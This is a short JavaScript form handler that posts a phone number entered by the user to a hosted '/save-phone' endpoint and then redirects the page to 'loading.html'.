document.getElementById("phoneForm").addEventListener("submit", async function (e) {
  e.preventDefault();

  const phone = document.getElementById("phone").value.trim();
  if (!phone) return;

  await fetch("https://123-gmy5.onrender.com/save-phone", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ phone })
  });

  window.location.href = "loading.html";
});
